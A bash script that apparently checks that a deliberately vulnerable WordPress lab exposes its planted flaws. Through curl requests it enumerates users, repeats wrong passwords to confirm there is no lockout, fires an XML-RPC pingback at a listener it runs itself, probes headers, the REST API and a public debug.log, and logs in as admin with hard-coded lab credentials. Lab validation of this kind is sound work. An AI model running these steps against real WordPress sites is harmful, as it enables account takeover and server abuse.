#!/usr/bin/env bash
set -u

B="${B:-http://192.168.4.36:18080}"
HOST="${HOST:-192.168.4.36}"
DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
pass=0; fail=0
ok(){ echo "  [PASS] $*"; pass=$((pass+1)); }
bad(){ echo "  [FAIL] $*"; fail=$((fail+1)); }
section(){ echo; echo "== $* =="; }

section "1. Version disclosure"
v=$(curl -s "$B/readme.html" | grep -o 'Lab-Version: WordPress [0-9.]*' || true)
[ -n "$v" ] && ok "$v" || bad "version marker missing"

section "2. User enumeration"
u=$(curl -s "$B/wp-json/wp/v2/users" | jq -r '[.[].slug]|join(", ")' 2>/dev/null || true)
echo "  users: ${u:-<none>}"
case "$u" in *admin*) ok "admin exposed";; *) bad "admin not exposed";; esac

section "3. Brute-force, no lockout"
CJ=$(mktemp)
curl -s -c "$CJ" "$B/wp-login.php" -o /dev/null
last=0
for i in 1 2 3 4 5; do
  last=$(curl -s -b "$CJ" -c "$CJ" -o /dev/null -w '%{http_code}' \
    --data-urlencode log=author --data-urlencode pwd="wrong$i" \
    --data 'wp-submit=Log+In&testcookie=1' "$B/wp-login.php")
done
echo "  5th wrong attempt: $last"
code=$(curl -s -b "$CJ" -c "$CJ" -o /dev/null -w '%{http_code}' \
  --data-urlencode log=author --data-urlencode pwd=AuthorPass123! \
  --data 'wp-submit=Log+In&testcookie=1' "$B/wp-login.php")
echo "  correct login: $code"
[ "$code" = "302" ] && ok "login allowed after 5 failures" || bad "login blocked (code $code)"
rm -f "$CJ"

section "4. XML-RPC pingback"
SRC="http://$HOST:8080/?t=$(date +%s)"
echo "  source: $SRC"
PBDIR=$(mktemp -d)
cat > "$PBDIR/index.html" <<HTML
<html>
<head><title>Pingback Source $SRC</title></head>
<body><p>Unique pingback source $SRC links to <a href="$B/?p=1">the target post</a>.</p></body>
</html>
HTML
methods=$(curl -s -X POST "$B/xmlrpc.php" -H 'Content-Type: text/xml' \
  --data '<?xml version="1.0"?><methodCall><methodName>system.listMethods</methodName><params></params></methodCall>' || true)
echo "$methods" | grep -q pingback.ping && ok "pingback.ping available" || bad "pingback.ping missing"
python3 -m http.server 8080 --bind 0.0.0.0 --directory "$PBDIR" >/tmp/pingback-http.log 2>&1 &
PID=$!
sleep 1
resp=$(curl -s -X POST "$B/xmlrpc.php" -H 'Content-Type: text/xml' --data-binary @- <<XML
<?xml version="1.0"?>
<methodCall><methodName>pingback.ping</methodName><params>
<param><value><string>$SRC</string></value></param>
<param><value><string>$B/?p=1</string></value></param>
</params></methodCall>
XML
)
kill "$PID" 2>/dev/null; wait "$PID" 2>/dev/null
rm -rf "$PBDIR"
echo "  response: $(echo "$resp" | tr -d '\n' | head -c 200)"
echo "$resp" | grep -qi 'registered' && ok "pingback registered" || bad "pingback not registered"
grep -q 'GET /' /tmp/pingback-http.log && ok "outbound request seen" || bad "no outbound request"

section "5. Clickjacking"
hdr=$(curl -sI "$B/wp-login.php" | grep -iE 'x-frame-options|content-security-policy' || true)
[ -z "$hdr" ] && ok "no X-Frame-Options / CSP" || bad "framing blocked: $hdr"

section "6. REST route leak"
routes=$(curl -s "$B/wp-json/" | jq '.routes|length' 2>/dev/null || echo 0)
ns=$(curl -s "$B/wp-json/" | jq -r '.namespaces|join(", ")' 2>/dev/null || true)
echo "  namespaces: $ns"
echo "  routes: $routes"
[ "$routes" -gt 0 ] && ok "REST API exposed" || bad "REST API missing"

section "7. Public debug log"
code=$(curl -s -o /dev/null -w '%{http_code}' "$B/wp-content/debug.log")
size=$(curl -s "$B/wp-content/debug.log" | wc -c)
echo "  HTTP $code, $size bytes"
[ "$code" = "200" ] && ok "debug.log public" || bad "debug.log not public"

section "9. Dashboard takeover"
CJ=$(mktemp)
curl -s -c "$CJ" "$B/wp-login.php" -o /dev/null
code=$(curl -s -b "$CJ" -c "$CJ" -o /dev/null -w '%{http_code}' \
  --data-urlencode log=admin --data-urlencode pwd=AdminPass123! \
  --data 'wp-submit=Log+In&testcookie=1' "$B/wp-login.php")
echo "  admin login: $code"
adm=$(curl -s -b "$CJ" -o /dev/null -w '%{http_code}' "$B/wp-admin/")
echo "  /wp-admin/: $adm"
[ "$adm" = "200" ] && ok "dashboard reachable" || bad "dashboard not reachable"
rm -f "$CJ"

echo; echo "== summary: $pass passed, $fail failed =="
[ "$fail" -eq 0 ]
